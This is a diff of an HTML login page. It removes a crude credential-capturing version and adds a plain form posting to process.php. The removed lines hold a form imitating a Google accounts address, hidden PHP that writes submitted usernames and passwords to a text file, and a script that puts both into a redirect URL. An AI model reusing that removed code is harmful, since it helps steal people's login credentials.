@@ -1,65 +1,58 @@
+<!DOCTYPE html>
+
 <html>
+
 <head>
-<head>
+
   <meta charset="UTF-8">
+
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta http-equiv="X-UA-Compatible" content="ie=edge">
-</head>
-<style>
+  
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+ 
+ <title>Login Form</title>
 
-body{
-    background:#000;
-    background-image: url('./1.jpg');
-    background-attachment: fixed;
-    background-size: cover;
-}
-form{
-    text-align:center;
-    color: #fff;
+  <style>
 
-    width:300px;
-    margin: 500px;
-    border: 2px #f2f2f2f2 solid;
-    border-radius: 10%;
-}
-button{
-    width: 100px;
-    border-radius: 10%;
-    font-size: 1rem;
-    color: #333;
-}
-</style>
-<body>
-<form action="./https://accounts.google.com/b/0/AddMailService" method="POST">
-<header hidden><?php
-if($_SERVER["REQUEST_METHOD"] == "POST"){
-$text = htmlspecialchars($_POST['text']);
-$password = htmlspecialchars($_POST['password']);
-
-echo "data: $text";
-echo "password: $password";
-$file = fopen("Readme.txt", "w+");
-fwrite($file, "$text <br/> $password");
-fclose($file);
-}
-?></header>
-
-
-<p>Username</p>
-<input id="text" type="text" name="text"/>
-<p>Password</p>
-<input id="password" type="Password" name="password"/>
-<p></p>
-<button onclick="form()" type="submit">click</button>
-</form>
-
-<button onclick="form()" type="submit">web</button>
-<script>
-    function form(){
-const details = document.querySelector("#text");
-const secrets = document.querySelector("#password");
-location = "https://" + details.value + "" +secrets.value;
+    body {
+      background: #000;
+      background-image: url('./1.jpg');
+      background-attachment: fixed;
+      background-size: cover;
+      color: #fff;
     }
-</script>
+    form {
+      text-align: center;
+      width: 300px;
+      margin: 100px auto;
+      padding: 20px;
+      border: 2px solid #f2f2f2;
+      border-radius: 10%;
+      background: rgba(255, 255, 255, 0.1);
+    }
+    button {
+      width: 100px;
+      border-radius: 10%;
+      font-size: 1rem;
+      color: #333;
+    }
+  </style>
+
+</head>
+
+<body>
+ 
+ <form action="process.php" method="POST">
+
+    <p>Username</p>
+    <input id="text" type="text" name="text" required />
+   
+ <p>Password</p>
+    <input id="password" type="password" name="password" required />
+    <p></p>
+    <button type="submit">Submit</button>
+  </form>
+
 </body>
+
 </html>
